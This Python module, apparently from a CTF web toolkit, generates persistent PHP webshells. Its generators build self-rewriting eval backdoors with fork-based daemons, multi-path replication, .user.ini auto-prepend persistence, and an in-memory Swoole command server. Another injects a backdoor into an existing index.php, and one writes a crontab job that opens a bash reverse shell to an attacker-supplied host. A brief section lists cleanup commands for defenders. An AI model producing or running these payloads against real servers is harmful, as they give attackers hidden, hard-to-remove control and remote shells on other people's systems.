"""
CTF Web Toolkit - Immortal Shell (不死马) Generator
支持：
  - PHP 不死马（无限循环持续写文件）
  - 内存马（PHP-FPM / Apache mod_php）
  - 定时任务持久化
  - Session 持久化马
  - proc_open 型不死马
"""

import base64
from typing import Optional
from core.utils import ok, info, warn, section


# ══════════════════════════════════════════════
#  经典 PHP 不死马
# ══════════════════════════════════════════════

class ImmortalShell:

    # ── 基础不死马 ────────────────────────────
    @staticmethod
    def basic(shell_path: str = "/var/www/html/.shell.php",
              password: str = "cmd",
              interval: float = 0.1) -> str:
        """
        最基础的不死马：fork 子进程，无限循环写 shell 文件
        interval: 写文件间隔秒数（越小越难清除）
        """
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        us = int(interval * 1_000_000)
        return f'''<?php
ignore_user_abort(true);
set_time_limit(0);
$file = "{shell_path}";
$code = base64_decode("{b64_code}");
while(true){{
    file_put_contents($file, $code);
    usleep({us});
}}
?>'''

    # ── fork 子进程型不死马（推荐）──────────────
    @staticmethod
    def fork_daemon(shell_path: str = "/var/www/html/.shell.php",
                    password: str = "cmd") -> str:
        """
        通过 pcntl_fork 创建守护进程
        父进程正常返回响应，子进程在后台循环写 shell
        """
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        return f'''<?php
$pid = pcntl_fork();
if($pid == -1){{
    // fork 失败，降级为 ignore_user_abort
    ignore_user_abort(true);
    set_time_limit(0);
    $file = "{shell_path}";
    $code = base64_decode("{b64_code}");
    while(true){{
        file_put_contents($file, $code);
        usleep(100000);
    }}
}} elseif($pid == 0){{
    // 子进程：守护进程循环
    posix_setsid();
    $file = "{shell_path}";
    $code = base64_decode("{b64_code}");
    while(true){{
        file_put_contents($file, $code);
        usleep(100000);
    }}
}} else {{
    // 父进程：正常返回，不引起怀疑
    echo "Success";
}}
?>'''

    # ── 利用 register_shutdown_function ───────
    @staticmethod
    def shutdown_func(shell_path: str = "/var/www/html/.shell.php",
                      password: str = "cmd") -> str:
        """
        注册 shutdown 函数，PHP 脚本结束时写入 shell
        同时通过 ignore_user_abort 保持运行
        """
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        return f'''<?php
ignore_user_abort(true);
set_time_limit(0);
register_shutdown_function(function(){{
    $file = "{shell_path}";
    $code = base64_decode("{b64_code}");
    while(true){{
        file_put_contents($file, $code);
        usleep(100000);
    }}
}});
echo "ok";
?>'''

    # ── 自我复制不死马 ─────────────────────────
    @staticmethod
    def self_replicate(shell_paths: list = None,
                       password: str = "cmd") -> str:
        """
        写多个路径，任删一个不影响，互相备份
        """
        if shell_paths is None:
            shell_paths = [
                "/var/www/html/.a.php",
                "/var/www/html/upload/.b.php",
                "/tmp/.c.php",
            ]
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        paths_php = "[" + ",".join(f'"{p}"' for p in shell_paths) + "]"
        return f'''<?php
ignore_user_abort(true);
set_time_limit(0);
$paths = {paths_php};
$code = base64_decode("{b64_code}");
while(true){{
    foreach($paths as $f){{
        @file_put_contents($f, $code);
        @chmod($f, 0777);
    }}
    usleep(100000);
}}
?>'''

    # ── Session 不死马 ─────────────────────────
    @staticmethod
    def session_shell(password: str = "cmd") -> str:
        """
        将恶意代码写入 Session 文件，
        包含 session 文件即可执行（配合 LFI 或 PHP session include）
        """
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        return f'''<?php
session_start();
$_SESSION["shell"] = base64_decode("{b64_code}");
// Session 文件路径：/tmp/sess_SESSIONID
// 利用 LFI 包含 session 文件即可触发
echo session_id();
?>'''

    # ── .user.ini 不死马 ──────────────────────
    @staticmethod
    def user_ini_immortal(web_root: str = "/var/www/html",
                          shell_filename: str = ".cache.php",
                          password: str = "cmd") -> str:
        """
        写 .user.ini + 隐藏 shell 文件
        PHP 每隔 TTL 秒（默认300）会重新读 .user.ini
        所以循环写 .user.ini 即可保持持久性
        """
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        ini_content = f"auto_prepend_file={shell_filename}"
        ini_b64 = base64.b64encode(ini_content.encode()).decode()
        return f'''<?php
ignore_user_abort(true);
set_time_limit(0);
$root = "{web_root}";
$ini = base64_decode("{ini_b64}");
$shell = base64_decode("{b64_code}");
$shell_file = $root . "/" . "{shell_filename}";
$ini_file = $root . "/.user.ini";
while(true){{
    @file_put_contents($ini_file, $ini);
    @file_put_contents($shell_file, $shell);
    @chmod($ini_file, 0644);
    @chmod($shell_file, 0644);
    usleep(500000);
}}
?>'''

    # ── crontab 持久化 ─────────────────────────
    @staticmethod
    def crontab_persist(shell_path: str = "/var/www/html/.shell.php",
                        password: str = "cmd",
                        lhost: str = "", lport: int = 0) -> str:
        """写 crontab 实现持久化（需要 shell_exec 可用）"""
        shell_code = f'<?php @eval($_POST["{password}"]);?>'
        b64_code = base64.b64encode(shell_code.encode()).decode()
        cron_lines = [
            f"* * * * * echo {b64_code}|base64 -d > {shell_path}",
        ]
        if lhost and lport:
            cron_lines.append(
                f"* * * * * bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
            )
        cron_content = "\\n".join(cron_lines)
        return f'''<?php
$code = base64_decode("{b64_code}");
file_put_contents("{shell_path}", $code);
// 写 crontab
$cron = `crontab -l 2>/dev/null`;
$new_jobs = "{cron_content}";
if(strpos($cron, "base64 -d > {shell_path}") === false){{
    $cron .= "\\n" . $new_jobs . "\\n";
    $tmp = tempnam("/tmp","cron");
    file_put_contents($tmp, $cron);
    shell_exec("crontab " . $tmp);
    unlink($tmp);
    echo "Crontab installed";
}} else {{
    echo "Already installed";
}}
?>'''


# ══════════════════════════════════════════════
#  PHP 内存马（无文件落地）
# ══════════════════════════════════════════════

class MemoryShell:
    """PHP 内存马：注册 Filter/Middleware，不写磁盘文件"""

    # ── PHP-FPM FastCGI 内存马概念 ────────────
    @staticmethod
    def register_tick_func(password: str = "cmd") -> str:
        """
        利用 register_tick_function 在每个 tick 执行代码
        结合 ignore_user_abort 实现内存驻留
        """
        return f'''<?php
ignore_user_abort(true);
set_time_limit(0);
declare(ticks=1);
register_tick_function(function() use (&$flag){{
    if(!$flag && isset($_POST["{password}"])){{
        $flag = true;
        @eval($_POST["{password}"]);
        $flag = false;
    }}
}});
// 保持进程活跃
while(true) usleep(10000);
?>'''

    # ── Swoole/Workerman 环境内存马 ───────────
    @staticmethod
    def swoole_shell(password: str = "cmd", port: int = 9999) -> str:
        """Swoole HTTP Server 型内存马"""
        return f'''<?php
// 需要 Swoole 扩展
$server = new Swoole\\HTTP\\Server("0.0.0.0", {port});
$server->on("request", function($req, $resp) {{
    $cmd = $req->post["{password}"] ?? $req->get["{password}"] ?? null;
    if($cmd){{
        ob_start();
        system($cmd);
        $out = ob_get_clean();
        $resp->end("<pre>$out</pre>");
    }} else {{
        $resp->end("Not Found");
    }}
}});
$server->start();
?>'''

    # ── 模拟 Behinder 内存马注入（需要已有 shell）─
    @staticmethod
    def inject_comment(inject_to: str = "/var/www/html/index.php",
                       password: str = "cmd") -> str:
        """
        向合法 PHP 文件头部注入内存马代码（无痕注入）
        利用 PHP 注释隐藏恶意代码
        """
        shell = f'if(isset($_POST["{password}"]))@eval($_POST["{password}"]);'
        b64 = base64.b64encode(shell.encode()).decode()
        return f'''<?php
// 读取目标文件
$target = "{inject_to}";
$content = file_get_contents($target);
$inject = '<?php eval(base64_decode("{b64}")); ?>';
// 检查是否已注入
if(strpos($content, "{b64}") === false){{
    // 在第一行 <?php 后注入
    $content = str_replace("<?php", "<?php\\n" . $inject . "\\n", $content, $count);
    if($count > 0){{
        file_put_contents($target, $content);
        echo "Injected";
    }} else {{
        echo "No PHP tag found";
    }}
}} else {{
    echo "Already injected";
}}
?>'''


# ══════════════════════════════════════════════
#  不死马对抗：查杀提示
# ══════════════════════════════════════════════

KILL_TIPS = """
不死马查杀方法（防守方参考）：
──────────────────────────────
1. 重启 PHP-FPM / Web 服务器（终止所有 PHP 进程）
   $ systemctl restart php-fpm nginx

2. 查找并 kill 恶意 PHP 进程
   $ ps aux | grep php
   $ kill -9 <PID>

3. 检查并删除 .user.ini（防止自动加载）
   $ find /var/www -name ".user.ini" -delete

4. 创建同名目录阻止写文件
   $ mkdir /var/www/html/.shell.php

5. 设置目录不可写
   $ chmod 555 /var/www/html/

6. 使用 inotifywait 监控文件变化
   $ inotifywait -m -r /var/www/html -e create,modify

7. 检查 crontab
   $ crontab -l
   $ cat /etc/cron.d/*

8. 查找近期修改的文件
   $ find /var/www -newer /var/www/html/index.php -type f
"""


# ══════════════════════════════════════════════
#  生成入口
# ══════════════════════════════════════════════

IMMORTAL_TYPES = {
    "basic":         ImmortalShell.basic,
    "fork":          ImmortalShell.fork_daemon,
    "shutdown":      ImmortalShell.shutdown_func,
    "replicate":     lambda pw: ImmortalShell.self_replicate(password=pw),
    "session":       ImmortalShell.session_shell,
    "user_ini":      lambda pw: ImmortalShell.user_ini_immortal(password=pw),
    "crontab":       lambda pw: ImmortalShell.crontab_persist(password=pw),
    "mem_tick":      MemoryShell.register_tick_func,
    "mem_inject":    lambda pw: MemoryShell.inject_comment(password=pw),
}


def generate(shell_type: str = "fork",
             password: str = "cmd",
             shell_path: str = "/var/www/html/.shell.php",
             output_path: Optional[str] = None) -> str:
    """生成不死马"""
    section(f"不死马生成: {shell_type}")

    if shell_type not in IMMORTAL_TYPES:
        info(f"可用类型: {', '.join(IMMORTAL_TYPES.keys())}")
        return ""

    gen = IMMORTAL_TYPES[shell_type]
    import inspect
    sig = inspect.signature(gen)
    if "shell_path" in sig.parameters:
        code = gen(shell_path=shell_path, password=password) \
            if "password" in sig.parameters else gen(shell_path=shell_path)
    else:
        code = gen(password)

    ok(f"  密码参数: {password}")
    ok(f"  写入路径: {shell_path}")
    ok(f"  大小: {len(code)} bytes")

    if output_path:
        with open(output_path, "w", encoding="utf-8") as f:
            f.write(code)
        ok(f"  已保存: {output_path}")
    else:
        print("\n" + "─" * 60)
        print(code)
        print("─" * 60 + "\n")

    return code


def show_kill_tips():
    warn(KILL_TIPS)
